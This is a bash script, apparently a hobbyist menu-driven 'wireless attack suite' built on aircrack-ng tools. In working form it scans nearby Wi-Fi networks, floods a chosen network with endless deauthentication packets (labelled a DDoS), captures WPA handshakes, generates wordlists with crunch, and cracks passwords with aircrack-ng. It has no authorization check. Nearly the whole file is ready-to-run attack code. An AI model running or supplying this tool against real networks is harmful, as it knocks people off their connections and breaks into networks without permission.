#!/bin/bash

red="\033[38;5;196m"
green="\033[38;5;82m"
yellow="\033[0;33m"
blue="\033[38;5;51m"
reset="\033[0m" # Reset color to default

toilet -f mono12 -F metal -W "_AIR __ STRIKE" | lolcat
echo -e "ADVANCED WIRELESS ATTACK SUITE" | lolcat
cowsay -f dragon-and-cow PROFESSOR VISHAL professorvishal31@gmail.com | lolcat
sleep 2

while true
do

        sudo airmon-ng check kill
        sudo airmon-ng start wlan0
        figlet CHOOSE A METHOD FOR WIRELESS PENTESTING -c | lolcat

        echo -e "${red}[1]WIFI OFFENSIVE SCANNING AND ENUMERATION${reset}"
        echo -e "${green}[2]WIFI DDOS ATTACK${reset}"
        echo -e "${yellow}[3]WIFI PASSWORD ATTACK${reset}"
	echo -e "${blue}[4]DECRYPT CAP FILES${reset}"
	echo -e "\n"
	read method;

	sleep 3

	echo -e "\n"
	echo -e "LISTING YOUR NETWORK INTERFACES ..." | lolcat
	sleep 2
	iwconfig
	echo -e "\n"
	echo -e "ENTER YOUR NETWORK INTERFACE : " | lolcat
	read netint

        case $method in
                1)
                        echo -e "\nSCANNING FOR ALL THE WIFI NETWORKS AROUND YOU !!!" | lolcat
			sleep 3

                        sudo timeout 30s sudo airodump-ng $netint
                        sleep 2

                        echo -e "\nENTER TARGET'S BSSID TO SCAN : " | lolcat
                        read bssid

                        echo -e "\nENTER THE CHANNEL NUMBER OF THE TARGET : " | lolcat
                        read channel

                        echo -e "\nSCANNING THE WIFI NETWORK AND IDENTIFYING THE MAC ADDRESS OF ALL THE DEVICES/CHANNELS CONNECTED TO IT !!!" | lolcat
			sleep 3

                        sudo timeout 40s airodump-ng --bssid $bssid --channel $channel $netint
                        sleep 2

                        ;;

		2)

                        echo -e "\nSCANNING FOR ALL THE WIFI NETWORKS AROUND YOU !!!" | lolcat
                        sleep 3
                        sudo timeout 30s sudo airodump-ng $netint
                        sleep 2

                        echo -e "\nENTER TARGET'S BSSID TO SCAN : " | lolcat
                        read bssid

                        echo -e "\nENTER THE CHANNEL NUMBER OF THE TARGET : " | lolcat
                        read channel

                        echo -e "\nSCANNING THE WIFI NETWORK AND IDENTIFYING THE MAC ADDRESS OF ALL THE DEVICES/CHANNELS CONNECTED TO IT !!!" | lolcat
                        sleep 3
                        sudo timeout 40s airodump-ng --bssid $bssid --channel $channel $netint &
                        AirodumpPID=$!


                        echo -e "\nSTARTING DDOS USING AIREPLAY-NG ...." | lolcat
			sleep 3
                        sudo aireplay-ng --deauth 0 -a $bssid $netint

                        sudo kill -SIGINT $AirodumpPID
                        sleep 2
			
			;;

		
		3)
                        echo -e "\nSCANNING FOR ALL THE WIFI NETWORKS AROUND YOU !!!" | lolcat
			sleep 3
                        sudo timeout 30s sudo airodump-ng $netint
                        sleep 2

                        echo -e "\nENTER TARGET'S BSSID TO SCAN : " | lolcat
                        read bssid

                        echo -e "\nENTER THE CHANNEL NUMBER OF THE TARGET : " | lolcat
                        read channel

                        echo -e "\nSCANNING THE WIFI NETWORK AND IDENTIFYING THE MAC ADDRESS OF ALL THE DEVICES/CHANNELS CONNECTED TO IT !!!" | lolcat
			echo -e "\npress ctrl+c to stop ...." | lolcat
                        sleep 3
			sudo timeout 40s airodump-ng --bssid $bssid --channel $channel -w capture $netint &
                        AirodumpPID=$!

			#handshake caputres
			echo -e"\nWAIT TO CAPTURE HANDSHAKE FILES, PRESS CTRL+C TO STOP :)" | lolcat
			sleep 3
                        sudo airodump-ng --bssid $bssid --channel $channel -w capture --ignore-negative-one $netint

                  
                        echo -e "\nSTARTING DDOS USING AIREPLAY-NG ...." | lolcat
			echo -e "\nPress ctrl+c to stop ..." | lolcat
			sleep 3

                        sudo aireplay-ng --deauth 0 -a $bssid $netint
                       
                        sudo kill -SIGINT $AirodumpPID
                        sleep 2

			echo -e "\nDo you want to generate a password list ? " | lolcat
			echo -e "${green}[1] Yes${reset}"
			echo -e "${red}[2] No${reset}"
			read crun

			if [ $crun -eq 1 ]
			then
				echo -e "\nEnter the length of password: " | lolcat
				read len

				echo -e "\nEnter the characters to be present: " | lolcat
				read ch

				echo -e "\nEnter the filename to be saved: " | lolcat
				read out

				echo -e "\nGenerating password list... " | lolcat
				sleep 2
				echo -e "\n"

				crunch $len $ch -o $out

			else
				echo -e "\nCracking the handshake file ... " | lolcat

			fi

			echo -e "\n${red}Enter the name of handshake file to crack : ${reset}"
			read handshake

			echo -e "\n${blue}Enter the password file to perform dictionary attack : ${reset}"
			read dict

                        echo -e "\nCRACKING WIFI PASSWORD USING AIRCRACK-NG :)" | lolcat
			sleep 3

			aircrack-ng $handshake -w $dict
                        ;;

		4)

                       echo -e "\nDo you want to generate a password list ? " | lolcat
                        echo -e "${green}[1] Yes${reset}"
                        echo -e "${red}[2] No${reset}"
                        read crun

                        if [ $crun -eq 1 ]
                        then
                                echo -e "\nEnter the length of password: " | lolcat
                                read len

                                echo -e "\nEnter the characters to be present: " | lolcat
                                read ch

                                echo -e "\nEnter the filename to be saved: " | lolcat
                                read out

                                echo -e "\nGenerating password list... " | lolcat
                                sleep 2
                                echo -e "\n"

                                crunch $len $ch -o $out

                        else
                                echo -e "\nCracking the handshake file ... " | lolcat

                        fi


			echo -e "\nENTER THE CAP FILE TO DECRYPT" | lolcat
			read cap
			echo -e "\nENTER THE PASSWORD FILE TO BRUTEFORCE" | lolcat
			read pass

			aircrack-ng $cap -w $pass

			;;

		*)
                        echo -e "${red}INVALID OPTION :( \n${reset}"
                        ;;

        esac

	airmon-ng check kill

        echo -e "\n${yellow}Want to attack more wifi targets?\n${reset}"
        echo -e "${green}1.CONTINUE${reset}"
        echo -e "${red}2.EXIT\n${reset}"
        read conti

        if [ $conti -eq 1 ]
        then
                echo -e "${green}OK${reset}"
        else
                cowsay -f kiss COME BACK SOON !!! | lolcat
                break
        fi
        num=$(( $num+1 ))
        sleep 5.5

        echo -e "${reset}"
done


